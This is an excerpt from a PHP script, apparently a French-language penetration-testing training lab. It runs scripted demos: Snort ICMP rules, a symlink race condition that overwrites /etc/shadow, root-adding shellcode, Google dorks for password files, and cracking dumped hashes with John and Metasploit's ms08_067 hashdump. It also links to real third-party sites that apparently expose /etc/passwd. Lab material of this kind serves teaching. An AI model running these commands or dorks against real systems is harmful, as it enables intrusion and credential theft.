		    $this->net("https://s3.amazonaws.com/snort-org/www/rules/community/community-rules.tar.gz");
		    $this->pause();
		    $this->requette("grep -i ICMP /etc/snort/rules/*icmp*.rules");
		    $this->pause();
		    $this->requette("grep -i ICMP /etc/snort/rules/*icmp*.rules | grep -i windows");
		    $this->pause();
		    $cmd1 = "echo '$this->root_passwd' | sudo -S tshark -i $this->eth_lan -n icmp -x ";
		    // ssh($this->xp,"rohff","hacker","ping $this->prof");
		    $cmd2 = "php $this->dir_inc/labs.ssh.inc.php $this->xp rohff hacker \'ping $this->prof\' ";
		    $this->exec_parallel($cmd1, $cmd2, 8);
		    // system($query);pause();
		    $this->requette("echo 'alert icmp any any -> any any (msg:\"ICMP PING *NIX\"; itype:8; content:\"|10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F|\"; depth:32; sid:366; rev:7;)
				alert icmp any any -> any any (msg:\" Rohff ICMP PING ECHO\"; icode:0; itype:8; sid:384; rev:5;)
				alert icmp any any -> any any (msg:\" Rohff ICMP Echo Reply\"; icode:0; itype:0; sid:408; rev:5;)
				alert icmp any any -> any any (msg:\" Rohff ICMP IRDP router advertisement\"; itype:9; sid:363; rev:7;)
				alert icmp any any -> any any (msg:\" Rohff ICMP IRDP router selection\"; itype:10; sid:364; rev:7;)
				alert icmp any any -> any any (msg:\" Rohff ICMP PING BSDtype\"; itype:8; content:\"|08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17|\"; sid:368; rev:6;)
				alert icmp any any -> any any (msg:\" Rohff ICMP PING Windows\"; itype:8; content:\"abcdefghijklmnop\"; depth:16; sid:382; rev:7;)
				alert icmp any any -> any any (msg:\" Rohff ICMP traceroute\"; icode:0;itype:8; ttl:1;  sid:385; rev:4;)
				alert icmp any any -> any any (msg:\" Rohff ICMP Address Mask Reply\"; icode:0; itype:18; sid:386; rev:5;)
				alert icmp any any -> any any (msg:\" Rohff ICMP Address Mask Request\"; icode:0; itype:17; sid:388; rev:5;)
				alert icmp any any -> any any (msg:\" Rohff ICMP Information Reply\";  itype:16; sid:415; rev:5;)
				alert icmp any any -> any any (msg:\" Rohff ICMP Information Request\";  itype:15; sid:417; rev:5;)
				alert icmp any any -> any any (msg:\" Rohff ICMP Timestamp Reply\"; icode:0; itype:14; sid:451; rev:5;)
				alert icmp any any -> any any (msg:\" Rohff ICMP Timestamp Request\"; icode:0; itype:13; sid:453; rev:5;)
				alert icmp any any -> any any (msg:\" Rohff ICMP destination unreachable\"; icode:2; itype:3; sid:20451; rev:5;)' > $this->dir_tmp/rohff_icmp.rules");
		    $this->pause();
		    $this->requette("gedit $this->dir_tmp/rohff_icmp.rules");
		    $this->pause();
		    $this->article("After Snort Started", "\n\t$this->fw$ ping -c 1 $this->win7\n\t$this->win7$ ping -c 1 $dsl");
		    $this->pause();
		    $snort = "echo '$this->root_passwd' | sudo -S hping3 -I $this->eth_lan -c 1 --icmptype 8 $this->win7;sleep 3s;sudo icmpush -vv -rta $this->prof $this->win7;sleep 3s;sudo icmpush -vv  -rts $this->win7;sleep 3s;\
		sudo hping3 -I $this->eth_lan -c 1 --icmptype 13 $this->win7;sleep 3s;sudo hping3 -I $this->eth_lan -c 1 --icmptype 14 $this->win7;sleep 2s;sudo icmpush -vv  -info $this->win7;sleep 2s;sudo hping3 -I $this->eth_lan -c 1 --icmptype 17 $this->win7";
		    $cmd1 = "echo '$this->root_passwd' | sudo -S snort -c $this->dir_tmp/rohff_icmp.rules -A console -i $this->eth_lan";
		    $cmd2 = "$snort";
		    exec_parallel($cmd1, $cmd2, 3);
		    $this->pause();
		    
		    
		    
		    graphic_step_1_gathering_info ();
		}
		
		
			
		
		
		function poc4crypto() {
			
		$this->chapitre("CRYPTOGRAPHY");
		$this->article("Cryptographie", "L'art et la science de garder le secret des messages");
		$cleartext = "j'ai des informations tres confidentielles a vous confier, appelez moi a 19h precise au 012345";
		$this->titre("0x050501 Intro");
		intro::introCrypto($cleartext);
		$this->pause();
		$this->titre("0x050502 Symetrique");
		intro::symetrique($cleartext);
		$this->pause();
		$this->titre("0x050503 Asymetrique");
		intro::asymetrique($cleartext);
		$this->pause();
		$this->titre("0x050504 Hashage");
		hashage($cleartext);
		$this->pause();
		$this->titre("0x050505 Hybride");
		hybride($cleartext);
		$this->pause();
		ssh ();
		$this->titre("0x050506 Certificat");
		certificat ();
		$this->pause();
		// titre("0x050507 Stegnographie");stegnographie();pause();
		$this->notify("END CRYPTOGRAPHY");
		// tunnel_tcp2tcp4ssh();

		}
		
	
		public function poc4host4root(){
			
		// Mimikatz is an outstanding tool for extracting cleartext passwords from memory
			
		
		
		$this->start("Be a root");
		
		// ######################################################################################
		$this->gtitre("Physical access");
		// SYS (ophcrack,pwdump, boot sh)
		system_hacking ();
		/*
		 * root@labs:/home/labs# locate crt0.o
		 * /usr/i686-w64-mingw32/lib/gcrt0.o
		 * /usr/x86_64-w64-mingw32/lib/gcrt0.o
		 * see metasploit generic/debug_trap (generate a debug trap in the target preocess -> useful when inside victime
		 * msfpayload windows/messagebox EXITFUNC=process ICON=INFORMATION TEXT="Blabla"

		 * One can also list Unix Sockets by using lsof -U.
		 */
		
		// #############################################################################################
		
		// #############################################################################################
		$this->gtitre("metasploit - get priv");
		// try to make .vmem + investigation
		// #############################################################################################
		
		// ######################################################################################
		$this->gtitre("Exploit");
		$this->titre("Looking for Exploit");
		$this->net("https://github.com/PenturaLabs/Linux_Exploit_Suggester");
		$this->requette("perl $this->dir_tools/root/Linux_Exploit_Suggester.pl -k 3.0.0");
		$this->requette("perl $this->dir_tools/root/Linux_Exploit_Suggester.pl -k 2.6.28");
		$this->remarque("On ne peut pas faire des mise a jours donc les derniers exploits ne seront pas integrés");
		update_exploitdb ();
		exploitdb("root");
		exploitdb("privilege");
		// #######################################################################################
		
		// ######################################################################################
		$this->gtitre("Pool Overflow");
		// wndscan - Pool scanner for window stations - volatility
		
		// ######################################################################################
		
		// ######################################################################################
		$this->gtitre("Misc");
		// ######################################################################################
		}
		
		public function poc4host4root4setuid0(){
		$this->gtitre("Shellcode Root");
		$this->titre("using setuid(0) setguid(0) -> id=0");

		// stack, libc, ...etc
		/*
		*
		* shell root (à condition que le binaire ai le bit suid à 1) grâce aux syscalls
		* sys_setuid, sys_setgid et execve. Il suffit donc d’appeler successivement setuid(0), setgid(0) et
		* execve(‘/bin/sh’, {‘/bin/sh’, NULL}, NULL).
		*
		* #include <stdio.h>
		*
		* int main(){
		* char *name[2];
		*
		* name[0] = "/bin/sh";
		* name[1] = 0;
		* setreuid(0,0);
		* execve(name[0], name, 0);
		* }
		*/
		
		$this->gtitre("using shellcode to add user into /etc/password");
		$this->note("add user and connect to ssh with this user");
		$this->titre("On Debian");
		$this->requette("gedit $this->dir_c/root_add_root_user_with_password_143_bytes_2011-06-23_debian-sh4_2.6.32-5-sh7751r.c");
		$this->pause();
		$this->requette("gedit $this->dir_c/root_Shellcode_Linux_x86 - chmod_777_etc_passwd _etc_shadow_ Add_New_Root_User_ALI_ALI_ Execute_bin_sh.c ");
		$this->pause();
		$this->titre("Yealink VoIP phone version SIP-T38G");
		$this->img("root/Yealink_VoIP_phone_version_SIP-T38G.jpg");
		$this->requette("gedit $this->dir_doc/Yealink_VoIP_phone_version_SIP-T38G.txt");
		$this->vdo("Yealink_VoIP_phone_version_SIP-T38G.flv", 0, 165);
		$this->pause();
		
		// rajouter les buffers avec un shellsuid 0
		}
		
		public function poc4host4root4Spyware4keylog(){
		$this->gtitre("Spyware");
		keylogger_strace ();
		// Add keylogger : (software + hardware + onde)
		
		
		
		volatility_intro ();
		
		$this->titre("Memory");
		// /proc/[pid]/mem
		init_memory ();
		
		// ######################################################################################
		$this->gtitre("Commande Execution");
		// exemple du heap process -> contient les commandes -> dump password enter by user
		// ######################################################################################
		}
		
		
		public function poc4host4root4racecondition(){
		$this->chapitre("Race Condition Exploit", "");
		$this->article("Race Condition", "Les situations de concurrence (race condition) laissent plusieurs processus disposer simultanément d'une même ressource (fichier, périphérique, mémoire), alors que chacun d'eux pense en avoir l'usage exclusif. 
				Cela conduit à l'existence de bogues intempestifs difficiles à déceler, mais également de véritables failles pouvant compromettre la sécurité globale du système.");
		$this->article("Principe", "Le principe général des situations de concurrence est le suivant : un processus désire accéder de manière exclusive à une ressource du système. 
				Il s'assure qu'elle ne soit déjà utilisée par un autre processus, puis se l'approprie, et l'emploie à sa guise. 
				Le problème survient lorsqu'un autre processus profite du laps de temps s'écoulant entre la vérification et l'accès effectif pour s'attribuer la même ressource. 
				Les conséquences peuvent être très variées. Dans certains cas classiques de la théorie des systèmes d'exploitation, on se retrouve dans des situations de blocages définitifs des deux processus. 
				Dans les cas plus pratiques, ce comportement mène à des dysfonctionnements parfois graves de l'application, voire à de véritables failles de sécurité quand un des processus profite indûment des privilèges de l'autre.");
		$this->pause();
		$this->requette("cat /etc/shadow");
		$this->requette("echo '$this->root_passwd' | sudo -S cat /etc/shadow");
		$this->pause();
		$this->ssTitre("Simulation de Race conditions");
		$name = "root_race_condition_1";
		$rep_path = "$this->dir_tmp/root_setuid0";
		if (file_exists($rep_path)) system("rm -rv $rep_path");
		$this->create_folder($rep_path);
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static
		$ret2lib = $bin->file_c2elf("-ggdb -m32 ");
		$file_bin = new bin4linux($ret2lib->file_path);
		$programme = $file_bin->file_path;
		
		$this->article("Deroulement", "le programme commence par effectuer toutes les vérifications nécessaires, s'assurant que le fichier existe, qu'il appartient à l'utilisateur et qu'il s'agit bien d'un fichier normal. Ensuite il effectue l'ouverture réelle et l'écriture du message. Et c'est là que réside la faille de sécurité ! ou plutôt c'est dans le laps de temps qui s'écoule entre la lecture des attributs du fichier avec stat() et son ouverture avec fopen(). Ce délai est peut-être infime habituellement, mais il n'est pas nul, et un attaquant peut en profiter pour modifier les caractéristiques du fichier. Pour simplifier notre attaque nous allons ajouter une ligne faisant dormir le processus entre les deux opérations, afin d'avoir le temps de faire l'intervention à la main.");
		$this->requette("echo '$this->root_passwd' | sudo -S cp -v /etc/shadow /etc/shadow.bak");
		$this->requette("ls -ail $programme");
		$this->requette("echo '$this->root_passwd' | sudo -S chown root:root $programme");
		$this->requette("echo '$this->root_passwd' | sudo -S chmod +s $programme");
		$this->requette("ls -ail $programme");
		$this->ssTitre("ouvrir un fichier qui n'appartient pas au user actuel");
		$this->requette("$programme /var/www/html/Accueil.php 'rohff' ");
		$this->requette("ls -ail /var/www/html/Accueil.php");
		$this->pause();
		
		$this->ssTitre("Current User");
		$name = "root_users_groupes";
		$rep_path = "$this->dir_tmp/root_setuid0";
		if (file_exists($rep_path)) system("rm -rv $rep_path");
		$this->create_folder($rep_path);
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static
		$ret2lib = $bin->file_c2elf("-ggdb -m32 ");
		$file_bin = new bin4linux($ret2lib->file_path);
		$programme = $file_bin->file_path;
		$this->requette($programme);
		$this->pause();
		
		$this->ssTitre("Real and Effectif User");
		$name = "root_user_real_effectif";
		$rep_path = "$this->dir_tmp/root_setuid0";
		if (file_exists($rep_path)) system("rm -rv $rep_path");
		$this->create_folder($rep_path);
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static
		$ret2lib = $bin->file_c2elf("-ggdb -m32 ");
		$file_bin = new bin4linux($ret2lib->file_path);
		$programme = $file_bin->file_path;
		$this->requette($programme);
		$this->pause();
		
		$this->requette("rm -f $rep_path/rohff_file.tmp");
		$this->requette("touch $rep_path/rohff_file.tmp");
		$this->requette("ls -ail $rep_path/rohff_file.tmp");
		$this->important("essayer de ne pas le faire sur votre Host");
		$this->cmd("localhost", "$programme $rep_path/rohff_file.tmp 'root::1:99999:::::' ");
		$this->cmd("localhost", "rm -vf $rep_path/rohff_file.tmp ; ln -s /etc/shadow $rep_path/rohff_file.tmp");
		$this->note("Pendant que le processus dort, nous avons une vingtaine de secondes pour supprimer le fichier régulier '$rep_path/rohff_file.tmp' et le remplacer par un lien (symbolique ou physique peu importe, les deux fonctionnent) vers le fichier /etc/shadow. 
				Rappelons que tout utilisateur peut créer dans un répertoire lui appartenant - ou dans /tmp, comme nous le verrons plus loin - un lien vers un fichier quelconque, même s'il n'a pas le droit d'en lire le contenu. 
				En revanche il n'est pas possible de créer une copie d'un tel fichier, car elle réclamerait une lecture complète.");
		$this->pause();
		$this->requette("cat /etc/shadow");
		$this->requette("echo '$this->root_passwd' | sudo -S cat /etc/shadow");
		$this->requette("echo '$this->root_passwd' | sudo -S cp -v /etc/shadow.bak /etc/shadow");
		$this->pause();
		
		
		$this->cmd($this->lts, "gcc -o $rep_path/root_soft $this->dir_c/root_soft.c");
		$this->cmd($this->lts, "gcc -o $rep_path/setuid_0 $this->dir_c/root_setuid_0.c");
		$this->cmd($this->lts, "while :; do ln -f $rep_path/root_soft $rep_path/log; ln -f $rep_path/setuid_0 $rep_path/log; done");
		$this->cmd($this->lts, "watch --interval 0,5 --exec ls -ail $rep_path/log");
		$this->cmd($this->lts, "while :; do nice -n 20 $rep_path/log; done");
		$this->pause();
		
		$this->cmd($this->lts, "ln $rep_path/root_soft $rep_path/log");
		$this->cmd($this->lts, "exec 3< $rep_path/log");
		$this->cmd($this->lts, "ls -l /proc/\$\$/fd/3");
		$this->cmd($this->lts, "rm -f $rep_path/log");
		$this->article("\$\$", "$$ pid of the current shell"); // $$ = The PID for the current process
		$this->requette("ps aux | grep `echo \$\$`");
		$this->cmd($this->lts, "ls -l /proc/$$/fd/3");
		$this->cmd($this->lts, "mv $rep_path/setuid_0 '$rep_path/log (deleted)'");
		$this->cmd($this->lts, "exec /proc/\$\$/fd/3");
		$this->cmd($this->lts, "id; whoami");
		$this->pause();
		$this->notify("END race Condition");
		}

		

		public function poc4googleHacking() {
			$this->start("Be a root");
		/*
		 *
		 *
		 * "Warning: mysql_connect()"
		 * "error in query"
		 * intitle:index.of "parent directory"
		 * allinurl:admin|config|upload|_history|login|phpinfo|system32|
		 * inurl:"htaccess|passwd|shadow|htusers"
		 * filetype:cfg|db|inc|bak|pwd|dump|dmp
		 *
		 *
		 * allintitle: "index of /admin”
		 * allintitle: "index of /root”
		 * allintitle: restricted filetype:doc site:gov
		 * allintitle: restricted filetype :mail
		 * allintitle: sensitive filetype:doc
		 * index of ftp +.mdb allinurl:/cgi-bin/ +mailto
		 * intitle:index.of.admin or intitle:index.of inurl:admin
		 * intitle:"index of" .bash_history
		 * intitle:"Index of" config.php
		 * intitle:"index of" etc/shadow
		 * intitle:"Index of" htpasswd
		 * intitle:"Index of" master.passwd
		 * intitle:"index of" members OR accounts
		 * intitle:index.of? mp3 jackson
		 * intitle:index.of "parent directory"
		 * intitle:"index of" passwd
		 * intitle:"Index of" passwords modified
		 * intitle:"index of" people.lst
		 * intitle:"index of" pwd.db
		 * intitle:index.of "server at"
		 * intitle:"index of" .sh_history
		 * intitle:"index of" site:epfl.ch
		 * intitle:"index of" spwd
		 * intitle:"index of" user_carts OR user_cart
		 * inurl:admin intitle:login
		 * inurl:backup intitle:index.of inurl:admin
		 * "This document is private | confidential | secret" ext:doc | ext:pdf | ext:xls intitle:"index of" "jpg | png | bmp" inurl:personal inurl:private
		 *
		 *
		 * Warning: mysql_connect() [function.mysql-connect]: Too many connections in /home/dzma/public_html/myred/include/mysql.php on line 10
		 * Too many connections
		 *
		 * "parent directory "
		 * intitle:index.of "parent directory"
		 * intitle:"Index of" passwords modified
		 * allinurl: admin mdb
		 * inurl:passlist.txt
		 * intitle:index.of? mp3 jackson
		 * inurl:microsoft filetype:iso
		 * inurl:service.pwd
		 * "http://*:*@www" domainname
		 * allinurl:auth_user_file.txt
		 * intitle:"Index of" config.php
		 * filetype:bak inurl:"htaccess|passwd|shadow|htusers"
		 * intitle:"index of" site:epfl.ch
		 * allintext:name email phone address intext:"thomas fischer" ext:pdf
		 * "create table" "insert into" "pass|passwd|password" (ext:sql | ext:dump | ext:dmp | ext:txt) "your password is *" (ext:csv | ext:doc | ext:txt)
		 * "This document is private | confidential | secret" ext:doc | ext:pdf | ext:xls intitle:"index of" "jpg | png | bmp" inurl:personal inurl:private
		 * allinurl:etc/passwd
		 * filetype:doc site:gov confidential
		 * intext:exploits
		 * "Index of /" +passwd
		 * "Index of /" +password.txt
		 * "Index of /" +.htaccess
		 * Index of /admin
		 * Index of /passwd
		 * Index of /password
		 * Index of mail
		 * inurl:admin filetype:txt
		 * inurl:admin filetype:db
		 * inurl:admin filetype:cfg
		 * inurl:mysql filetype:cfg
		 * inurl:passwd filetype:txt
		 * inurl:iisadmin
		 * inurl:auth_user_file.txt
		 * inurl:orders.txt
		 * inurl:"wwwroot/*."
		 * inurl:adpassword.txt
		 * inurl:webeditor.php
		 * inurl:file_upload.php
		 * inurl:gov filetype:xls "restricted"
		 * index of ftp +.mdb allinurl:/cgi-bin/ +mailto
		 * allintitle: "index of /root”
		 * allintitle: "index of /admin”
		 * intitle:"Index of" master.passwd
		 * intitle:"Index of" htpasswd
		 * intitle:"index of" spwd
		 * intitle:"index of" etc/shadow
		 * intitle:"index of" members OR accounts
		 * intitle:"index of" user_carts OR user_cart
		 * intitle:"index of" pwd.db
		 * intitle:"index of" people.lst
		 * intitle:"index of" passwd
		 * intitle:"index of" .bash_history
		 * intitle:"index of" .sh_history
		 * intitle:index.of "server at"
		 * inurl:login.asp or inurl:/admin/login.asp
		 * inurl:backup intitle:index.of inurl:admin
		 * inurl:admin filetype:xls
		 * inurl:admin intitle:login
		 * inurl:admin inurl:userlist
		 * inurl:admin filetype:asp inurl:userlist
		 *
		 * allintitle: sensitive filetype:doc
		 * allintitle: restricted filetype :mail
		 * allintitle: restricted filetype:doc site:gov
		 * allinurl:"exchange/logon.asp"
		 *
		 * allinurl:/phpinfo.php
		 * intitle:index.of.admin or intitle:index.of inurl:admin
		 * "Syntax error in query expression " –the
		 *
		 * allinurl:winnt/system32/
		 * inurl:.bash_history
		 *
		 * inurl:ViewerFrame?Mode=Refresh
		 * inurl:"viewerframe?/mode=motion"
		 * intitle:"Index of" config.php username/password 4 sql database -Forum w/admin access
		 *
		 *
		 * /sh3llZ/c99
		 *
		 * Metagoofil :
		 * rohff@r6h4ck3r:/pentest/enumeration/google/metagoofil$ ./metagoofil.py
		 *
		 *
		 * Company Information
		 * For the following modules ticket, please see this ticket: http://dev.metasploit.com/redmine/issues/5966
		 * Companies have to make a lot of information public, (especially public companies). This isn’t
		 * always easy to get to and EDGAR (a database for the SEC) has a lot of great information. To
		 * access this in Metasploit, I have hacked up a couple of modules. They consume the CorpWatch
		 * API (which ties in with EDGAR) to search and find information on companies:
		 * CorpWatch Search: http://files.volatileminds.net/misc/corpwatch_search.rb
		 * msf > use auxiliary/gather/corpwatch_search
		 * msf auxiliary(corpwatch_search) > set COMPANY_NAME Rapid7
		 * msf auxiliary(corpwatch_search) > set LIMIT 1
		 * msf auxiliary(corpwatch_search) > set YEAR 2010
		 * msf auxiliary(corpwatch_search) > run
		 * Company Information
		 * ===================
		 * CorpWatch ID
		 * ------------
		 * cw_585281
		 * Company Name
		 * ------------
		 * Rapid7 LLC
		 * Address
		 * -------
		 * 545 BOYLSTON STREET, SUITE 400, BOSTON MA 02116
		 *
		 * CorpWatch Info: http://files.volatileminds.net/misc/corpwatch_info.rb
		 * msf > use auxiliary/gather/corpwatch_info
		 * msf auxiliary(corpwatch_search) > set CW_ID cw_585281
		 * msf auxiliary(corpwatch_search) > set YEAR 2010
		 * msf auxiliary(corpwatch_search) > run
		 *
		 * An example module that uses loot is the enum_ms_product_keys module:
		 * msf > use post/windows/gather/enum_ms_product_keys
		 * msf post(enum_ms_product_keys) > set SESSION 1
		 * msf post(enum_ms_product_keys) > run
		 * msf post(enum_ms_product_keys) > loot
		 * While there aren’t many recon or IG related modules in metasploit today, one could imagine a
		 * module which parsed google for company-relevant PDFs, and stored them as loot (even though
		 * they’re public info).
		 *
		 * Financial
		 * Using the corpwatch_info module (available here) you may set GET_FILINGS within Metasploit
		 * and retrieve any tax (10K) and SEC documents publicly available for any given company.
		 * GET_FILINGS is turned off by default to keep from spitting out too much data at once.
		 *
		 * > use auxiliary/gather/corpwatch_info
		 * auxiliary(corpwatch_info) > set CW_ID cw_585281
		 * auxiliary(corpwatch_info) > set GET_FILINGS true
		 * auxiliary(corpwatch_info) > run
		 *
		 * msf > use auxiliary/gather/search_email_collector
		 * msf auxiliary(search_email_collector) > show options
		 * msf auxiliary(search_email_collector) > set DOMAIN rapid7.com
		 * msf auxiliary(search_email_collector) > run
		 */
		$this->titre("googleHacking");
		$this->article("Google hacking", "is a term that refers to the art of creating queries in order to filter through large complex search engine amounts of search results for information related to computer security\
		Information that the Google Hacking Database identifies:
				Advisories and server vulnerabilities
				Error messages that contain too much information
				Files containing passwords
				Sensitive directories
				Pages containing logon portals
				Pages containing network or vulnerability data such as firewall logs
		Using Google as a Proxy Server :
Google some times works as a proxy server which requires a Google translated URL and some minor URL modification
		
Directory Listings : intitle:\"index of\"
A directory listing is a type of Web page that lists files and directories that exist on a Web server
intitle:index.of “parent directory” or intitle:index.of “name size”
intitle:index.of 'parent directory'
		
To locate “admin” directories that are admin
accessible from directory listings, queries such as intitle:index.of.admin or intitle:index.of inurl:admin will work well, as shown in the following figure
intitle:index.of inurl:“/admin/*”
		
		
Finding Specific Files :
To find WS_FTP log files, try a search such as intitle:index.of ws_ftp.log
intitle:index.of
index.php.bak or inurl:index.php.bak
		
Server Versioning :
The information an attacker can use to determine the best method for attacking a Web server is the exact software version
An attacker can retrieve that information by connecting directly to the Web port of that server and issuing a request for the HTTP headers
Some typical directory listings provide the name of the server software as well as the version number at the bottom portion. These information are faked and attack can be done on web server
intitle:index.of “ server at” query will locate all directory listings on the Web with
index of in the title and server at anywhere in the text of the page
In addition to identifying the Web server version, it is also possible to determine the
operating system of the server as well as modules and other software that is installed
Server versioning technique can be extended by including more details in the query
		");
		$this->pause();
		$this->requette("nautilus $this->dir_doc/google_hack_db");
		$this->pause();
		$this->ssTitre("Google Hacking Database (GHDB)");
		$this->net("http://www.hackersforcharity.org/ghdb/");
		$this->pause();
		$this->net("https://support.google.com/websearch/answer/136861?hl=fr&ref_topic=3081620");
		$this->net("http://www.exploit-db.com/google-dorks/");
		$this->pause();
		$this->ssTitre("Fichiers sensibles");
		$this->net("http://www.exploit-db.com/google-dorks/2/");
		$this->pause();
		$this->net("http://www.exploit-db.com/ghdb/3848/");
		$this->net("http://www.exploit-db.com/ghdb/3847/");
		$this->net("http://www.fetakgomo.gov.za/index.php?page=/etc/passwd");
		$this->net("http://conquest.org.za/sym/root/etc/group");
		$this->net("http://www.livelibresse.com.my/kw/wp-content/themes/twentyeleven/indon/sym/root/etc/group");
		$this->net("http://www.livelibresse.com.my/kw/wp-content/themes/twentyeleven/indon/sym/root/etc/passwd");
		$this->ssTitre("sym/root/etc/group");
		$this->net("http://www.livelibresse.com.my/kw/wp-content/themes/twentyeleven/indon/sym/root/etc/passwd");
		$this->net("http://nethergames.org/xfiles/foro/cache/sym/root/etc/passwd");
		$this->net("http://www.agirpourlasecuriteroutiere.asso.fr/IMG/File/sym/root/etc/passwd");
		$this->pause();
		$this->ssTitre("fichier robot.txt");
		$this->net("http://www.robotstxt.org/");
		$this->pause();
		$this->net("http://code.google.com/p/metagoofil/");
		$this->pause();
		$this->requette("python metagoofil.py -d mbis-inc.net -f all -l 3 -o $this->dir_tmp/mbis.html -f DL");
		$this->pause();
		$this->net("file://$this->dir_tmp/mbis.html");
		$this->pause();
		$this->ssTitre("renseignement au sujet d'une societe");
		$this->net("http://sec.gov/edgar/searchedgar/companysearch.html");
		$this->pause();
		gras("http://local.yahoo.com/ -> pages jaunes \n");
		gras("http://www.pagesjaunes.fr/\n");
		gras("http://www.yellowpages.com/");
		$this->net("http://searchdns.netcraft.com/?host=bull.fr");
		gras("List the contact information, email addresses, and telephone numbers") . "\n";
		gras("Search the Internet, newsgroups, bulletin boards, and negative websites for
information about the company") . "\n";
		$this->article("Searching", "footprinting searches include social networking sites (Facebook.com, Myspace.com, Reunion.com, Classmates.com), professional networking sites (Linkedin.com, Plaxo.com), career management sites (Monster.com, Careerbuilder.com), family ancestry sites (Ancestry.com), and even online photo management sites (Flickr.com, Photobucket.com) can be used against you and your company.");
		$this->pause();
		$this->ssTitre("Les Archives Du net");
		$this->net("http://web.archive.org/web/*/caramail.com");
		$this->pause();
		$this->ssTitre("Les MetaMoteurs");
		$this->net("http://midnightresearch.com/projects/search-engine-assessment-tool/");
		$this->net("http://addictomatic.com");
		$this->cmd("localhost", "$this->dir_tools/hosts/seat ");
		$this->pause();
		$this->pause();
		}
		

		// ===================================================================================
		
		// #################################### SHELLCODE #######################################################
		
		
		
		


// ############################ CRACK ############################################
public function poc4host4root4crackingPassword() {
		// Ajouter les ranbow tables


		// rambow table -> site web
		$this->net("http://ophcrack.sourceforge.net/tables.php");
		$this->net("http://project-rainbowcrack.com/table.htm");
		$this->net("http://fr.wikipedia.org/wiki/Rainbow_table");
		$this->pause();
		$this->titre("Cracking tools");
		$this->ssTitre("John The Ripper");
		$this->net("http://www.openwall.com/john/");
		$this->pause();
		$this->img("crack/passwords_cracking.jpg");
		$this->ssTitre("Passwords Formats");
		$this->requette("cd /opt/john-1.8.0/run/; ./john");
		$this->pause();
		$this->titre("Cracking Windows Passwords Formats");
		$this->article("SAM File", "C'est le fichier qui va contenir, les informations de sessions : les mots de pass y compris.
Il faut savoir que ce fichier est biensure, illisible, et inaccessible lorsque nous sommes sur notre session.
Il est 'verrouillé' par le systeme.
		Windows 95, 98 -> fichier .pwl
		Windows NT -> C:\windows\system32\config\ -> sam._
Il existe donc deux alternatives pour nous :
		- L'on boot sur une distribution linux par exemple, où l'on va copier le sam sur un périphérique de stockage.
		- On utilise un outil comme pwdump.");
		$this->pause();
		$this->ssTitre("Dump SAM (NTML Hashes) ");
		$this->ssTitre("PwDump");
		$this->net("http://passwords.openwall.net/a/pwdump/pwdump7.zip");
		$this->cmd($this->xp, "C:\pwdump7\PwDump7.exe");
		$this->pause();
		$this->ssTitre("Dump SHADOW");
		ssh($this->msf, "root", "rohff", 'cat /etc/shadow');
		$this->pause();
		$this->requette("gedit $this->dir_tools/crack/crack_sam.txt $this->dir_tools/crack/crack_shadow.txt ");
		$this->pause();
		$this->requette("wc -l $this->dir_tools/dico/2M_passwd.lst");
		$this->pause();
		system("cd /opt/john-1.8.0/run/; sudo rm -v `ls *.rec` `ls *.log` `ls *.pot` ");
		$this->article("tload", "affiche la charge CPU sous forme de graphique");
		$this->cmd("localhost", "tload");
		$this->pause();
		$this->ssTitre("Crack Password SAM");
		$this->cmd("localhost", "cd /opt/john-1.8.0/run/ ;sudo ./john $this->dir_tools/crack/crack_sam.txt --session=$this->dir_tmp/sam.pot --fork=6 --wordlist:\"$this->dir_tools/dico/2M_passwd.lst\" ");
		$this->ssTitre("Crack Password SHADOW");
		$this->cmd("localhost", "cd /opt/john-1.8.0/run/ ;sudo ./john $this->dir_tools/crack/crack_shadow.txt --session=$this->dir_tmp/shadow.pot --fork=11 --wordlist:\"$this->dir_tools/dico/2M_passwd.lst\" ");
		$this->pause();
		$this->ssTitre("Show Results");
		$this->requette("cd /opt/john-1.8.0/run/ ;sudo ./john --show $this->dir_tools/crack/crack_sam.txt");
		$this->requette("cd /opt/john-1.8.0/run/ ;sudo ./john --show $this->dir_tools/crack/crack_shadow.txt");
		$this->pause();
		$this->ssTitre("Other way to get NTLM Hash");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/ms08_067_netapi RHOST=\"$this->xp\" TARGET=25 AutoRunScript=\"hashdump\" E");
		$this->pause();
		$this->ssTitre("MSF with John");
		$query = "echo \"db_status\n use exploit/windows/smb/ms08_067_netapi\n set RHOST \"$this->xp\"\nset TARGET 25\nset AutoRunScript \"hashdump\"\nrun\n use auxiliary/analyze/jtr_crack_fast\n run\n \" > $this->dir_tmp/ntlm_hash_john.rc";
		$this->requette($query);
		$this->requette("cat $this->dir_tmp/ntlm_hash_john.rc");
		$this->pause();
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/ntlm_hash_john.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
		$this->pause();
		// ssTitre("SMB no cracking Password Need, just need the Password NTLM Hash");
		// cmd("localhost","echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/psexec RHOST=\"$this->xp\" SMBPass=\"aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\" SMBUser=\"Administrateur\" E");
		// cmd("localhost","echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/psexec RHOST=\"$this->xp\" SMBPass=\"bce739534ea4e445aad3b435b51404ee:5e7599f673df11d5c5c4d950f5bf0157\" SMBUser=\"rohff\" E");
		// pause();
		$this->ssTitre("Cracking Password Online");
		$this->net("https://crackstation.net/");
		$this->net("http://www.hashkiller.co.uk/ntlm-decrypter.aspx");




		$this->article("Brute-force Attack Countermeasure", "
		The best defense for brute-force guessing is to use strong passwords that are not easily
		guessed. A one-time password mechanism would be most desirable. Some free utilities
		that will help make brute forcing harder to accomplish are listed in Table 5-1.
		Newer UNIX operating systems include built-in password controls that alleviate
		some of the dependence on third-party modules. For example, Solaris 10 provides a
		number of options through /etc/default/passwd to strengthen a systems password
		policy including:
		• PASSLENGTH		Minimum password length
		• MINWEEK		Minimum number of weeks before a password can be changed
		• MAXWEEK		Maximum number of weeks before a password must be changed
		• WARNWEEKS Number of weeks to warn a user ahead of time their password is about to expire
